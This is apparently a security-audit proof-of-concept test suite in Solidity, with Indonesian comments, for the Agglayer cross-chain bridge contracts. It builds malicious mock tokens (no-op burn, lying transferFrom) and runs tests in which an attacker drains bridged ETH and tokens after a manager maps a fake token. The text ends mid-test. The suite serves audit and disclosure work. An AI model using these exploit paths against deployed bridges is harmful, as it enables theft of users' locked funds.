// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.28;

// PoC audit ronde 9 worker A - varian lanjutan temuan R8-F
// (agglayer-contracts @ 110bda5a, HEAD tidak bergerak vs r8:
// main 110bda5a, develop cfdca3c2 - dicek via git ls-remote).
//
// Area: AgglayerBridgeL2.setMultipleSovereignTokenAddress /
// setSovereignWETHAddress + bridgeAsset cabang wrapped + LBT global,
// dan jalur lain yang menyentuh LBT (forwardLET, setMultipleClaims,
// unsetMultipleClaims, setLocalBalanceTree, migrateLegacyToken,
// emergency paths) + guard setara di bridge mainnet.
//
// Harness: salinan agglayer-r8-poc (cache/out ikut disalin).
// Mock MockUSDC / FakeBurnToken / MockGERL2GER dipakai ulang dari
// AgglayerR8GER.t.sol.

import "forge-std/Test.sol";
import {AgglayerBridge} from "../src/AgglayerBridge.sol";
import {AgglayerBridgeL2} from "../src/sovereignChains/AgglayerBridgeL2.sol";
import {AgglayerGER} from "../src/AgglayerGER.sol";
import {IBaseLegacyAgglayerGER} from "../src/interfaces/IBaseLegacyAgglayerGER.sol";
import {IAgglayerBridgeL2} from "../src/interfaces/IAgglayerBridgeL2.sol";
import {MerkleHelper} from "./AgglayerR1.t.sol";
import {MockUSDC, FakeBurnToken, MockGERL2GER} from "./AgglayerR8GER.t.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts5/proxy/ERC1967/ERC1967Proxy.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts52/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts52/proxy/transparent/ProxyAdmin.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice ERC20 lengkap (approve/transferFrom/burn jujur, mint terbuka).
contract MockERC20Full {
    string public name;
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "no allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(address account, uint256 amount) external {
        require(balanceOf[account] >= amount, "insufficient");
        balanceOf[account] -= amount;
    }
}

/// @notice Token yang burn-nya hanya membakar SEPARUH amount.
/// Dipakai untuk mengukur amplifikasi: berapa leaf yang bisa dibuat dari
/// saldo fake yang sama (deret geometri -> ~2x).
contract PartialBurnToken {
    string public name = "Partial";
    string public symbol = "PART";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "no allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @notice Hanya membakar amount/2 - separuh "lolos".
    function burn(address account, uint256 amount) external {
        uint256 half = amount / 2;
        require(balanceOf[account] >= half, "insufficient");
        balanceOf[account] -= half;
    }
}

/// @notice Token yang transferFrom-nya BERBOHONG: mengkredit penerima tanpa
/// mendebit pengirim (mencetak saldo ke bridge). Dipakai untuk menguji
/// apakah jalur isNotMintable=true (balanceBefore/After) benar-benar aman
/// terhadap token yang memalsukan akuntansi.
contract FakeTransferToken {
    string public name = "Lying";
    string public symbol = "LYING";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transferFrom(
        address,
        address to,
        uint256 amount
    ) external returns (bool) {
        // Berbohong: kredit penerima, tidak pernah mendebit pengirim.
        balanceOf[to] += amount;
        return true;
    }

    function transfer(
        address to,
        uint256 amount
    ) external returns (bool) {
        balanceOf[to] += amount;
        return true;
    }

    function burn(address, uint256) external {}
}

contract AgglayerR9VariantsTest is Test {
    address public user = address(0xBEEF);
    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");
    address public user1 = makeAddr("user1");
    address public managerAddr = makeAddr("bridgeManager");
    address public mockBridgeAddr = makeAddr("mockBridge");
    address public mockManagerAddr = makeAddr("mockManager");

    uint256 public constant MAINNET_FLAG = 2 ** 64;

    AgglayerGER public ger;
    AgglayerBridge public bridgeMain;
    AgglayerBridgeL2 public bridgeL2; // S, network 2, gas = ether
    AgglayerBridgeL2 public bridgeL2Gas; // G, network 3, gas token ERC20
    AgglayerBridgeL2 public bridge1; // R1, network 1, gas = ether
    MockGERL2GER public mockGerL2;
    MockGERL2GER public mockGerL2Gas;
    MockGERL2GER public mockGerL2One;
    MockUSDC public usdc;
    MockERC20Full public tokenX; // token lokal di chain 1
    MockERC20Full public mockGas; // gas token chain G
    MockERC20Full public openMint; // token "real" untuk varian migrate
    FakeBurnToken public fakeToken;
    PartialBurnToken public partialToken;
    FakeTransferToken public lyingToken;

    bytes32[] internal leavesS; // leaf di exit tree S (network 2)
    bytes32[] internal leavesG; // leaf di exit tree G (network 3)
    bytes32[] internal leavesR1; // leaf di exit tree R1 (network 1)

    function setUp() public {
        vm.warp(1_700_000_000);
        vm.deal(address(this), 100 ether);
        vm.deal(user, 1000 ether);
        vm.deal(victim, 1000 ether);
        vm.deal(attacker, 2000 ether);
        vm.deal(user1, 1000 ether);

        // --- GER mainnet (proxy) ---
        AgglayerGER gerImpl = new AgglayerGER(mockManagerAddr, mockBridgeAddr);
        ger = AgglayerGER(address(new ERC1967Proxy(address(gerImpl), "")));
        ger.initialize();

        // --- Bridge mainnet (network 0) ---
        AgglayerBridge bridgeImpl = new AgglayerBridge();
        ProxyAdmin proxyAdmin = new ProxyAdmin(address(this));
        bridgeMain = AgglayerBridge(
            payable(
                address(
                    new TransparentUpgradeableProxy(
                        address(bridgeImpl),
                        address(proxyAdmin),
                        ""
                    )
                )
            )
        );
        bridgeMain.initialize(
            0,
            address(0),
            0,
            IBaseLegacyAgglayerGER(address(ger)),
            address(this),
            ""
        );
        vm.deal(address(bridgeMain), 100 ether);
        usdc = new MockUSDC();
        usdc.mint(address(bridgeMain), 5_000_000e6);

        // --- BridgeL2 S (network 2, gas = ether) ---
        mockGerL2 = new MockGERL2GER(address(this));
        AgglayerBridgeL2 bridgeImplL2 = new AgglayerBridgeL2();
        bridgeL2 = AgglayerBridgeL2(
            payable(address(new ERC1967Proxy(address(bridgeImplL2), "")))
        );
        bridgeL2.initialize(
            2,
            address(0),
            0,
            IBaseLegacyAgglayerGER(address(mockGerL2)),
            address(this),
            "",
            managerAddr,
            address(0),
            false,
            address(this),
            address(this),
            address(this)
        );
        vm.deal(address(bridgeL2), 2000 ether);

        // --- BridgeL2 G (network 3, gas token ERC20) ---
        mockGas = new MockERC20Full("Gas", "GAS", 18);
        mockGerL2Gas = new MockGERL2GER(address(this));
        AgglayerBridgeL2 bridgeImplG = new AgglayerBridgeL2();
        bridgeL2Gas = AgglayerBridgeL2(
            payable(address(new ERC1967Proxy(address(bridgeImplG), "")))
        );
        bridgeL2Gas.initialize(
            3,
            address(mockGas),
            3,
            IBaseLegacyAgglayerGER(address(mockGerL2Gas)),
            address(this),
            abi.encode("Gas", "GAS", uint8(18)),
            managerAddr,
            address(0), // deploy WETH baru
            false,
            address(this),
            address(this),
            address(this)
        );
        vm.deal(address(bridgeL2Gas), 10 ether);

        // --- BridgeL2 R1 (network 1, gas = ether) ---
        mockGerL2One = new MockGERL2GER(address(this));
        AgglayerBridgeL2 bridgeImpl1 = new AgglayerBridgeL2();
        bridge1 = AgglayerBridgeL2(
            payable(address(new ERC1967Proxy(address(bridgeImpl1), "")))
        );
        bridge1.initialize(
            1,
            address(0),
            0,
            IBaseLegacyAgglayerGER(address(mockGerL2One)),
            address(this),
            "",
            managerAddr,
            address(0),
            false,
            address(this),
            address(this),
            address(this)
        );
        vm.deal(address(bridge1), 10 ether);

        tokenX = new MockERC20Full("USD Coin", "USDC", 6);
        openMint = new MockERC20Full("Real2", "R2", 6);
        fakeToken = new FakeBurnToken();
        partialToken = new PartialBurnToken();
        lyingToken = new FakeTransferToken();
    }

    // ================= helpers =================

    function _ger(bytes32 m, bytes32 r) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(m, r));
    }

    function _lbtKey(
        uint32 originNetwork,
        address originTokenAddress
    ) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(originNetwork, originTokenAddress));
    }

    function _recordGer(bytes32 m, bytes32 r) internal {
        vm.prank(mockBridgeAddr);
        ger.updateExitRoot(m);
        vm.prank(mockManagerAddr);
        ger.updateExitRoot(r);
    }

    function _wbal(address token, address who) internal returns (uint256) {
        vm.prank(user);
        return IERC20(token).balanceOf(who);
    }

    function _leaf(
        uint8 t,
        uint32 on,
        address oa,
        uint32 dn,
        address da,
        uint256 amt,
        bytes memory md
    ) internal pure returns (bytes32) {
        return
            MerkleHelper.leafValue(t, on, oa, dn, da, amt, keccak256(md));
    }

    function _pushSLeaf(
        uint8 t,
        uint32 on,
        address oa,
        uint32 dn,
        address da,
        uint256 amt,
        bytes memory md
    ) internal {
        leavesS.push(_leaf(t, on, oa, dn, da, amt, md));
    }

    function _pushGLeaf(
        uint8 t,
        uint32 on,
        address oa,
        uint32 dn,
        address da,
        uint256 amt,
        bytes memory md
    ) internal {
        leavesG.push(_leaf(t, on, oa, dn, da, amt, md));
    }

    /// @notice Klaim asset leaf dari S (network 2) di bridge mainnet.
    function _claimAssetMainnetFromS(
        uint32 leafIdx,
        uint32 originNetwork,
        address originToken,
        address dest,
        uint256 amount,
        bytes memory metadata
    ) internal returns (bool ok) {
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(
            leavesS,
            leafIdx
        );
        bytes32 lerS = MerkleHelper.treeRoot(leavesS);
        bytes32[] memory rl = new bytes32[](2);
        rl[0] = bytes32(0);
        rl[1] = lerS;
        bytes32 r = MerkleHelper.treeRoot(rl);
        bytes32[32] memory proofRollup = MerkleHelper.treeProof(rl, 1);
        bytes32 m = bridgeMain.getRoot();
        _recordGer(m, r);
        (ok, ) = address(bridgeMain).call(
            abi.encodeCall(
                AgglayerBridge.claimAsset,
                (
                    proofLocal,
                    proofRollup,
                    (uint256(1) << 32) | uint256(leafIdx),
                    m,
                    r,
                    originNetwork,
                    originToken,
                    0,
                    dest,
                    amount,
                    metadata
                )
            )
        );
    }

    /// @notice Klaim asset leaf dari G (network 3) di bridge mainnet.
    function _claimAssetMainnetFromG(
        uint32 leafIdx,
        uint32 originNetwork,
        address originToken,
        address dest,
        uint256 amount,
        bytes memory metadata
    ) internal returns (bool ok) {
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(
            leavesG,
            leafIdx
        );
        bytes32 lerG = MerkleHelper.treeRoot(leavesG);
        bytes32[] memory rl = new bytes32[](3);
        rl[0] = bytes32(0);
        rl[1] = bytes32(0);
        rl[2] = lerG;
        bytes32 r = MerkleHelper.treeRoot(rl);
        bytes32[32] memory proofRollup = MerkleHelper.treeProof(rl, 2);
        bytes32 m = bridgeMain.getRoot();
        _recordGer(m, r);
        (ok, ) = address(bridgeMain).call(
            abi.encodeCall(
                AgglayerBridge.claimAsset,
                (
                    proofLocal,
                    proofRollup,
                    (uint256(2) << 32) | uint256(leafIdx),
                    m,
                    r,
                    originNetwork,
                    originToken,
                    0,
                    dest,
                    amount,
                    metadata
                )
            )
        );
    }

    /// @notice Klaim message leaf dari G (network 3) di bridge mainnet.
    function _claimMessageMainnetFromG(
        uint32 leafIdx,
        uint32 originNetwork,
        address originAddress,
        address dest,
        uint256 amount,
        bytes memory metadata
    ) internal returns (bool ok) {
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(
            leavesG,
            leafIdx
        );
        bytes32 lerG = MerkleHelper.treeRoot(leavesG);
        bytes32[] memory rl = new bytes32[](3);
        rl[0] = bytes32(0);
        rl[1] = bytes32(0);
        rl[2] = lerG;
        bytes32 r = MerkleHelper.treeRoot(rl);
        bytes32[32] memory proofRollup = MerkleHelper.treeProof(rl, 2);
        bytes32 m = bridgeMain.getRoot();
        _recordGer(m, r);
        (ok, ) = address(bridgeMain).call(
            abi.encodeCall(
                AgglayerBridge.claimMessage,
                (
                    proofLocal,
                    proofRollup,
                    (uint256(2) << 32) | uint256(leafIdx),
                    m,
                    r,
                    originNetwork,
                    originAddress,
                    0,
                    dest,
                    amount,
                    metadata
                )
            )
        );
    }

    /// @notice Klaim asset leaf dari S (network 2) di bridge R1 (network 1).
    function _claimAssetOnBridge1FromS(
        uint32 leafIdx,
        uint32 originNetwork,
        address originToken,
        address dest,
        uint256 amount,
        bytes memory metadata
    ) internal returns (bool ok) {
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(
            leavesS,
            leafIdx
        );
        bytes32 lerS = MerkleHelper.treeRoot(leavesS);
        bytes32[] memory rl = new bytes32[](2);
        rl[0] = bridge1.getRoot();
        rl[1] = lerS;
        bytes32 r = MerkleHelper.treeRoot(rl);
        bytes32[32] memory proofRollup = MerkleHelper.treeProof(rl, 1);
        bytes32 m = bytes32(uint256(0xA11CE));
        (ok, ) = address(bridge1).call(
            abi.encodeCall(
                AgglayerBridge.claimAsset,
                (
                    proofLocal,
                    proofRollup,
                    (uint256(1) << 32) | uint256(leafIdx),
                    m,
                    r,
                    originNetwork,
                    originToken,
                    1,
                    dest,
                    amount,
                    metadata
                )
            )
        );
    }

    /// @notice Import ETH mainnet -> S via klaim (origin (0,0)).
    function _importEthToS(uint256 amount, address to) internal {
        bytes32 leaf = _leaf(0, 0, address(0), 2, to, amount, "");
        bytes32[] memory one = new bytes32[](1);
        one[0] = leaf;
        bytes32 mRoot = MerkleHelper.treeRoot(one);
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(one, 0);
        bytes32[32] memory emptyProof;
        vm.prank(to);
        bridgeL2.claimAsset(
            proofLocal,
            emptyProof,
            MAINNET_FLAG | uint256(0),
            mRoot,
            bytes32(0),
            0,
            address(0),
            2,
            to,
            amount,
            ""
        );
    }

    /// @notice Import USDC mainnet -> S via klaim (origin (0,USDC)).
    function _importUsdcToS(uint256 amount, address to) internal {
        bytes memory md = abi.encode("USD Coin", "USDC", uint8(6));
        bytes32 leaf = _leaf(0, 0, address(usdc), 2, to, amount, md);
        bytes32[] memory one = new bytes32[](1);
        one[0] = leaf;
        bytes32 mRoot = MerkleHelper.treeRoot(one);
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(one, 0);
        bytes32[32] memory emptyProof;
        vm.prank(to);
        bridgeL2.claimAsset(
            proofLocal,
            emptyProof,
            MAINNET_FLAG | uint256(0),
            mRoot,
            bytes32(0),
            0,
            address(usdc),
            2,
            to,
            amount,
            md
        );
    }

    /// @notice Import ETH mainnet -> G via klaim (origin (0,0), terima WETH).
    function _importEthToG(uint256 amount, address to) internal {
        bytes32 leaf = _leaf(0, 0, address(0), 3, to, amount, "");
        bytes32[] memory one = new bytes32[](1);
        one[0] = leaf;
        bytes32 mRoot = MerkleHelper.treeRoot(one);
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(one, 0);
        bytes32[32] memory emptyProof;
        vm.prank(to);
        bridgeL2Gas.claimAsset(
            proofLocal,
            emptyProof,
            MAINNET_FLAG | uint256(0),
            mRoot,
            bytes32(0),
            0,
            address(0),
            3,
            to,
            amount,
            ""
        );
    }

    function _mapFakeToMainnetUsdcOnS() internal {
        uint32[] memory nets = new uint32[](1);
        nets[0] = 0;
        address[] memory origins = new address[](1);
        origins[0] = address(usdc);
        address[] memory sovs = new address[](1);
        sovs[0] = address(fakeToken);
        bool[] memory notMint = new bool[](1);
        notMint[0] = false;
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);
    }

    function _bridgeAssetRaw(
        address bridge,
        address caller,
        uint32 destNet,
        address dest,
        uint256 amount,
        address token
    ) internal returns (bool ok) {
        vm.prank(caller);
        (ok, ) = bridge.call(
            abi.encodeCall(
                AgglayerBridge.bridgeAsset,
                (destNet, dest, amount, token, false, "")
            )
        );
    }

    // ============ V1: native gas-token path origin (0,0) ============
    // bridgeAsset(token==0) minta msg.value == amount dan membuat leaf
    // (gasTokenNetwork, gasTokenAddress) = (0,0) di chain ether-native.
    // Ukur: penyerang bayar 100 ETH native S, klaim 100 ETH di mainnet.

    function test_R9V1_gasTokenPathIsOneToOne() public {
        _importEthToS(1000 ether, victim);
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(0))),
            1000 ether,
            "V1: LBT[(0,0)] harus 1000 setelah import"
        );
        assertEq(victim.balance, 2000 ether, "V1: korban terima 1000 ETH");

        // Bayar 1001 > LBT 1000 -> revert (LBT meng-gate jalur jujur juga).
        vm.deal(attacker, 2000 ether);
        vm.prank(attacker);
        (bool okOver, ) = address(bridgeL2).call{value: 1001 ether}(
            abi.encodeCall(
                AgglayerBridge.bridgeAsset,
                (uint32(0), attacker, 1001 ether, address(0), false, "")
            )
        );
        assertFalse(okOver, "V1: bridge 1001 > LBT 1000 HARUS revert");

        // msg.value 0 dengan amount 100 -> revert AmountDoesNotMatchMsgValue.
        vm.prank(attacker);
        (bool okZero, ) = address(bridgeL2).call(
            abi.encodeCall(
                AgglayerBridge.bridgeAsset,
                (uint32(0), attacker, 100 ether, address(0), false, "")
            )
        );
        assertFalse(okZero, "V1: msg.value 0 HARUS revert");

        // Jalur jujur: bayar 100 ETH native S.
        uint256 balBefore = attacker.balance; // 2000 ether
        vm.prank(attacker);
        bridgeL2.bridgeAsset{value: 100 ether}(
            0,
            attacker,
            100 ether,
            address(0),
            false,
            ""
        );
        _pushSLeaf(0, 0, address(0), 0, attacker, 100 ether, "");
        assertEq(attacker.balance, balBefore - 100 ether, "V1: bayar 100");
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(0))),
            900 ether,
            "V1: LBT turun 1000 -> 900"
        );

        // Klaim di mainnet -> terima 100 ETH.
        bool okClaim = _claimAssetMainnetFromS(
            0,
            0,
            address(0),
            attacker,
            100 ether,
            ""
        );
        assertTrue(okClaim, "V1: klaim mainnet HARUS sukses");
        assertEq(
            attacker.balance,
            2000 ether,
            "V1: NET PENYERANG = 0 (bayar 100, terima 100)"
        );
        emit log("V1: gas-token path 1:1 - bayar 100 ETH native, terima 100 ETH mainnet, laba 0 (NEGATIF)");
    }

    // ============ V1b: fake WETH (gas-token chain) - burn no-op ============
    // setSovereignWETHAddress (onlyBridgeManager) memetakan token arbitrer
    // sebagai WETHToken; bridgeAsset(token==WETHToken) membuat leaf (0,0)
    // via _bridgeWrappedAsset tanpa cek burn. Di chain ether-native,
    // remap WETH DITOLAK (WETHRemappingNotSupportedOnGasTokenNetworks).

    function test_R9V1b_fakeWethNoOpBurnDrainsImportedEth() public {
        // Remap WETH di chain ether-native S HARUS revert.
        vm.prank(managerAddr);
        vm.expectRevert(
            IAgglayerBridgeL2
                .WETHRemappingNotSupportedOnGasTokenNetworks
                .selector
        );
        bridgeL2.setSovereignWETHAddress(address(fakeToken), false);

        // Import 5 ETH ke G (korban terima 5 WETH), LBT[(0,0)] = 5.
        _importEthToG(5 ether, victim);
        address wethG = address(bridgeL2Gas.WETHToken());
        assertTrue(wethG != address(0), "V1b: G harus punya WETH");
        assertEq(_wbal(wethG, victim), 5 ether, "V1b: korban pegang 5 WETH");
        assertEq(
            bridgeL2Gas.localBalanceTree(_lbtKey(0, address(0))),
            5 ether,
            "V1b: LBT_G[(0,0)] harus 5"
        );

        // Manager memetakan token palsu (burn no-op) sebagai WETH G.
        vm.prank(managerAddr);
        bridgeL2Gas.setSovereignWETHAddress(address(fakeToken), false);

        // Penyerang (0 fake, 0 WETH) bridge 5 via fake WETH.
        assertEq(fakeToken.balanceOf(attacker), 0, "V1b: penyerang 0 fake");
        bool okBridge = _bridgeAssetRaw(
            address(bridgeL2Gas),
            attacker,
            0,
            attacker,
            5 ether,
            address(fakeToken)
        );
        assertTrue(okBridge, "V1b: bridge fake WETH HARUS sukses");
        _pushGLeaf(0, 0, address(0), 0, attacker, 5 ether, "");
        assertEq(fakeToken.balanceOf(attacker), 0, "V1b: burn no-op");
        assertEq(
            bridgeL2Gas.localBalanceTree(_lbtKey(0, address(0))),
            0,
            "V1b: LBT_G terkuras 5 -> 0"
        );

        // Klaim di mainnet -> 5 ETH asli.
        bool okClaim = _claimAssetMainnetFromG(
            0,
            0,
            address(0),
            attacker,
            5 ether,
            ""
        );
        assertTrue(okClaim, "V1b: klaim mainnet HARUS sukses");
        assertEq(attacker.balance, 2005 ether, "V1b: penyerang +5 ETH");

        // Korban kini tak bisa keluar (LBT habis).
        bool okVictim = _bridgeAssetRaw(
            address(bridgeL2Gas),
            victim,
            0,
            victim,
            5 ether,
            wethG
        );
        assertFalse(okVictim, "V1b: exit korban HARUS revert (LBT habis)");
        assertEq(_wbal(wethG, victim), 5 ether, "V1b: WETH korban tak ber-backing");
        emit log("V1b: POSITIF - fake WETH (burn no-op) kuras 5 ETH import, zero-cost; bypass fix R8-F #1 (origin 0 di _setSovereignTokenAddress)");
    }

    // ============ V1c: fake WETH via bridgeMessageWETH ============
    // bridgeMessageWETH juga memanggil _bridgeWrappedAsset(WETHToken);
    // message leaf menurunkan LBT[(0,0)] dan bisa diklaim via claimMessage.

    function test_R9V1c_fakeWethViaBridgeMessageWeth() public {
        _importEthToG(5 ether, victim);
        vm.prank(managerAddr);
        bridgeL2Gas.setSovereignWETHAddress(address(fakeToken), false);

        vm.prank(attacker);
        (bool ok, ) = address(bridgeL2Gas).call(
            abi.encodeCall(
                AgglayerBridge.bridgeMessageWETH,
                (uint32(0), attacker, 5 ether, false, "")
            )
        );
        assertTrue(ok, "V1c: bridgeMessageWETH fake HARUS sukses");
        _pushGLeaf(1, 3, attacker, 0, attacker, 5 ether, "");
        assertEq(
            bridgeL2Gas.localBalanceTree(_lbtKey(0, address(0))),
            0,
            "V1c: message leaf turunkan LBT_G[(0,0)] 5 -> 0"
        );

        bool okClaim = _claimMessageMainnetFromG(
            0,
            3,
            attacker,
            attacker,
            5 ether,
            ""
        );
        assertTrue(okClaim, "V1c: claimMessage mainnet HARUS sukses");
        assertEq(attacker.balance, 2005 ether, "V1c: penyerang +5 ETH via pesan");
        emit log("V1c: POSITIF - fake WETH via bridgeMessageWETH kuras 5 ETH import, zero-cost");
    }

    // ============ V1d: isNotMintable=true + transferFrom berbohong ============
    // Jalur isNotMintable=true memakai safeTransferFrom + balanceBefore/After.
    // Token yang memalsukan transferFrom (kredit bridge tanpa debit) tetap
    // lolos: balance check tidak membantu bila kontrak token berbohong.

    function test_R9V1d_lyingTransferFromBypassesNotMintablePath() public {
        _importUsdcToS(1000e6, victim);
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            1000e6,
            "V1d: LBT harus 1000"
        );

        // Manager memetakan token pembohong dengan isNotMintable = TRUE.
        uint32[] memory nets = new uint32[](1);
        nets[0] = 0;
        address[] memory origins = new address[](1);
        origins[0] = address(usdc);
        address[] memory sovs = new address[](1);
        sovs[0] = address(lyingToken);
        bool[] memory notMint = new bool[](1);
        notMint[0] = true;
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);

        assertEq(lyingToken.balanceOf(attacker), 0, "V1d: penyerang 0 LYING");
        bool okBridge = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1000e6,
            address(lyingToken)
        );
        assertTrue(okBridge, "V1d: bridge token pembohong HARUS sukses");
        _pushSLeaf(
            0,
            0,
            address(usdc),
            0,
            attacker,
            1000e6,
            abi.encode("Lying", "LYING", uint8(18))
        );
        assertEq(lyingToken.balanceOf(attacker), 0, "V1d: penyerang tetap 0");
        assertEq(
            lyingToken.balanceOf(address(bridgeL2)),
            1000e6,
            "V1d: bridge 'menerima' 1000 LYING yang dicetak token"
        );
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            0,
            "V1d: LBT terkuras"
        );

        bool okClaim = _claimAssetMainnetFromS(
            0,
            0,
            address(usdc),
            attacker,
            1000e6,
            abi.encode("Lying", "LYING", uint8(18))
        );
        assertTrue(okClaim, "V1d: klaim mainnet HARUS sukses");
        assertEq(usdc.balanceOf(attacker), 1000e6, "V1d: penyerang +1000 USDC asli");
        emit log("V1d: POSITIF - isNotMintable=true TIDAK menahan token yang memalsukan transferFrom (balance check kalah oleh token bohong)");
    }

    // ============ V2: forged origin ke rollup lain (network 1) ============
    // Manager S memetakan token palsu -> (1, X) di mana X token lokal chain 1.
    // Leaf diklaim di bridge chain 1: originNetwork == networkID -> bridge
    // membayar token LOKAL X dari saldonya (dana import user1 dari chain 1).

    function test_R9V2_forgedOriginOtherRollupDrainsRollup1() public {
        uint256 IMPORT = 1000e6;
        bytes memory xMetadata = abi.encode("USD Coin", "USDC", uint8(6));

        // 1. user1 bridge 1000 X dari chain 1 -> S (cabang lokal).
        tokenX.mint(user1, IMPORT);
        vm.prank(user1);
        tokenX.approve(address(bridge1), IMPORT);
        vm.prank(user1);
        bridge1.bridgeAsset(2, user1, IMPORT, address(tokenX), false, "");
        leavesR1.push(
            _leaf(0, 1, address(tokenX), 2, user1, IMPORT, xMetadata)
        );
        assertEq(
            bridge1.getRoot(),
            MerkleHelper.treeRoot(leavesR1),
            "V2: root R1 harus cocok"
        );
        assertEq(tokenX.balanceOf(address(bridge1)), IMPORT, "V2: R1 pegang 1000 X");

        // 2. user1 klaim di S: terima wrapped X, LBT_S[(1,X)] = 1000.
        bytes32 mRoot1 = MerkleHelper.treeRoot(leavesR1);
        bytes32[32] memory proofLocal1 = MerkleHelper.treeProof(leavesR1, 0);
        bytes32[] memory rl1 = new bytes32[](1);
        rl1[0] = mRoot1;
        bytes32 r1 = MerkleHelper.treeRoot(rl1);
        bytes32[32] memory proofRollup1 = MerkleHelper.treeProof(rl1, 0);
        bytes32[32] memory emptyProof;
        vm.prank(user1);
        bridgeL2.claimAsset(
            proofLocal1,
            proofRollup1,
            0, // globalIndex: rollupIndex 0, leafIndex 0
            bytes32(uint256(0xBEEF)),
            r1,
            1,
            address(tokenX),
            2,
            user1,
            IMPORT,
            xMetadata
        );
        address wrappedX = bridgeL2.tokenInfoToWrappedToken(
            keccak256(abi.encodePacked(uint32(1), address(tokenX)))
        );
        assertTrue(wrappedX != address(0), "V2: wrapped X harus ter-deploy");
        assertEq(_wbal(wrappedX, user1), IMPORT, "V2: user1 pegang 1000 wrapped X");
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(1, address(tokenX))),
            IMPORT,
            "V2: LBT_S[(1,X)] harus 1000"
        );

        // 3. Manager S memetakan token palsu -> (1, X).
        uint32[] memory nets = new uint32[](1);
        nets[0] = 1;
        address[] memory origins = new address[](1);
        origins[0] = address(tokenX);
        address[] memory sovs = new address[](1);
        sovs[0] = address(fakeToken);
        bool[] memory notMint = new bool[](1);
        notMint[0] = false;
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);

        // 4. Penyerang (0 wrapped, 0 fake) bridge 1000 via burn no-op.
        bool okBridge = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            1,
            attacker,
            IMPORT,
            address(fakeToken)
        );
        assertTrue(okBridge, "V2: bridge token palsu HARUS sukses");
        _pushSLeaf(
            0,
            1,
            address(tokenX),
            1,
            attacker,
            IMPORT,
            abi.encode("Fake", "FAKE", uint8(18))
        );
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(1, address(tokenX))),
            0,
            "V2: LBT_S[(1,X)] terkuras"
        );

        // 5. Klaim leaf palsu di bridge chain 1 -> terima 1000 X ASLI.
        bool okClaim = _claimAssetOnBridge1FromS(
            0,
            1,
            address(tokenX),
            attacker,
            IMPORT,
            abi.encode("Fake", "FAKE", uint8(18))
        );
        assertTrue(okClaim, "V2: klaim di chain 1 HARUS sukses");
        assertEq(tokenX.balanceOf(attacker), IMPORT, "V2: penyerang +1000 X asli");
        assertEq(tokenX.balanceOf(address(bridge1)), 0, "V2: saldo X R1 habis");

        // 6. user1 kini tak bisa keluar dari S.
        bool okVictim = _bridgeAssetRaw(
            address(bridgeL2),
            user1,
            1,
            user1,
            IMPORT,
            wrappedX
        );
        assertFalse(okVictim, "V2: exit user1 HARUS revert (LBT habis)");
        emit log("V2: POSITIF - forged origin (1,X) kuras 1000 X dari bridge chain 1, zero-cost (blast radius R8-F meluas ke rollup lain)");
    }

    // ============ V3: bridge mainnet tidak punya guard/fungsi mapping ============
    // wrappedTokenToTokenInfo di mainnet hanya ditulis claimAsset
    // terverifikasi; tidak ada fungsi admin apa pun yang menulis mapping.

    function test_R9V3_mainnetHasNoMappingFunction() public {
        // Semua fungsi mapping L2 HARUS tidak ada di bridge mainnet.
        (bool ok1, ) = address(bridgeMain).call(
            abi.encodeWithSignature(
